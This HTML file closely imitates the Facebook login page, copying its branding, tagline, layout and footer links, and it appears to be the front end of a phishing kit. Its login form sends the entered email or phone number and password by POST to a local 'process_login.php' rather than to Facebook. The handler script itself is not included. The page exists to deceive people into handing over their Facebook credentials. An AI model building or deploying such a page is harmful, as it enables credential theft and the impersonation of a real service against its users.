<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hBNJ1jB2A1V.ico">
    <style>
        /* Global styles */
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        /* Container for content */
        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 980px;
            padding: 20px;
            box-sizing: border-box;
        }

        /* Top section with logo and intro text */
        .intro-section {
            text-align: center;
            margin-bottom: 20px;
        }
        .intro-section img {
            width: 250px; /* Actual Facebook logo width */
            margin-bottom: -10px; /* Adjust to move text closer to logo */
        }
        .intro-section h2 {
            font-size: 28px;
            font-weight: normal;
            line-height: 32px;
            width: 480px;
            color: #1c1e21;
        }

        /* Login form card */
        .login-card {
            width: 396px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 15px 0 24px;
            box-sizing: border-box;
            text-align: center;
        }
        .form-group {
            margin-bottom: 10px;
        }
        .form-group input {
            width: calc(100% - 32px); /* 100% - padding-left - padding-right */
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            margin-bottom: 5px;
            box-sizing: border-box; /* Include padding in width */
        }
        .form-group input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .login-button {
            width: calc(100% - 32px);
            padding: 12px 16px;
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 5px;
        }
        .login-button:hover {
            background-color: #166fe5;
        }
        .forgot-password {
            display: block;
            margin-top: 16px;
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .divider {
            height: 1px;
            background-color: #dadde1;
            margin: 20px 16px;
        }
        .create-new-account {
            padding: 12px 16px;
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin-top: 10px;
        }
        .create-new-account:hover {
            background-color: #36a420;
        }
        .create-page-link {
            display: block;
            margin-top: 28px; /* Adjusted margin to push it down */
            font-size: 14px;
            color: #1c1e21;
            text-decoration: none;
        }
        .create-page-link a {
            font-weight: bold;
            color: #1c1e21;
            text-decoration: none;
        }
        .create-page-link a:hover {
            text-decoration: underline;
        }


        /* Footer section */
        .page-footer {
            margin-top: 28px;
            font-size: 12px;
            color: #8a8d91;
            width: 100%;
            max-width: 980px; /* Align with main content width */
            padding: 0 20px;
            box-sizing: border-box;
            text-align: center; /* Default for mobile, will adjust for desktop */
        }
        .page-footer .language-list {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            flex-wrap: wrap;
            justify-content: center; /* Center languages on mobile */
            border-bottom: 1px solid #dadde1; /* Separator for languages */
            padding-bottom: 10px;
            margin-bottom: 10px;
        }
        .page-footer .language-list li {
            margin: 0 8px 5px 0;
        }
        .page-footer .language-list li a {
            color: #8a8d91;
            text-decoration: none;
        }
        .page-footer .language-list li a:hover {
            text-decoration: underline;
        }
        .page-footer .language-list li:last-child {
            margin-right: 0; /* Remove right margin from last item */
        }
        .page-footer .more-links-section {
            display: flex;
            flex-wrap: wrap;
            justify-content: center; /* Center links on mobile */
            list-style: none;
            padding: 0;
            margin: 10px 0;
        }
        .page-footer .more-links-section li {
            margin: 0 8px 5px 0;
        }
        .page-footer .more-links-section li a {
            color: #8a8d91;
            text-decoration: none;
        }
        .page-footer .more-links-section li a:hover {
            text-decoration: underline;
        }
        .page-footer .copyright {
            margin-top: 10px;
            text-align: center; /* Center copyright on mobile */
        }


        /* Responsive adjustments */
        @media (min-width: 850px) {
            .main-container {
                flex-direction: row;
                justify-content: space-around;
            }
            .intro-section {
                text-align: left;
                margin-bottom: 0;
            }
            .page-footer {
                text-align: left; /* Align footer left on desktop */
            }
            .page-footer .language-list,
            .page-footer .more-links-section {
                justify-content: flex-start; /* Align links left on desktop */
            }
            .page-footer .copyright {
                text-align: left; /* Align copyright left on desktop */
            }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="intro-section">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/512px-2021_Facebook_icon.svg.png" alt="Facebook">
            <h2>Facebook helps you connect and share with the people in your life.</h2>
        </div>
        <div class="login-card">
            <form action="process_login.php" method="POST">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email address or phone number" required autocomplete="off">
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required autocomplete="off">
                </div>
                <button type="submit" class="login-button">Log in</button>
                <a href="#" class="forgot-password">Forgotten password?</a>
                <div class="divider"></div>
                <a href="#" class="create-new-account">Create new account</a>
            </form>
            <p class="create-page-link">
                <a href="#">Create a Page</a> for a celebrity, brand or business.
            </p>
        </div>
    </div>
    <div class="page-footer">
        <ul class="language-list">
            <li><a href="#">English (UK)</a></li>
            <li><a href="#">Kiswahili</a></li>
            <li><a href="#">Français (France)</a></li>
            <li><a href="#">Español</a></li>
            <li><a href="#">Português (Brasil)</a></li>
            <li><a href="#">العربية</a></li>
            <li><a href="#">Deutsch</a></li>
            <li><a href="#">Italiano</a></li>
            <li><a href="#">Türkçe</a></li>
            <li><a href="#">हिन्दी</a></li>
            <li><a href="#">中文(简体)</a></li>
        </ul>
        <ul class="more-links-section">
            <li><a href="#">Sign Up</a></li>
            <li><a href="#">Log in</a></li>
            <li><a href="#">Messenger</a></li>
            <li><a href="#">Facebook Lite</a></li>
            <li><a href="#">Video</a></li>
            <li><a href="#">Meta Pay</a></li>
            <li><a href="#">Meta Store</a></li>
            <li><a href="#">Meta Quest</a></li>
            <li><a href="#">Ray-Ban Meta</a></li>
            <li><a href="#">Meta AI</a></li>
            <li><a href="#">Instagram</a></li>
            <li><a href="#">Threads</a></li>
            <li><a href="#">Voting Information Centre</a></li>
            <li><a href="#">Privacy Policy</a></li>
            <li><a href="#">Privacy Centre</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Create ad</a></li>
            <li><a href="#">Create Page</a></li>
            <li><a href="#">Developers</a></li>
            <li><a href="#">Careers</a></li>
            <li><a href="#">Cookies</a></li>
            <li><a href="#">AdChoices</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">Contact uploading and non-users</a></li>
            <li><a href="#">Settings</a></li>
            <li><a href="#">Activity log</a></li>
        </ul>
        <div class="copyright">
            Meta © 2025
        </div>
    </div>
</body>
</html>
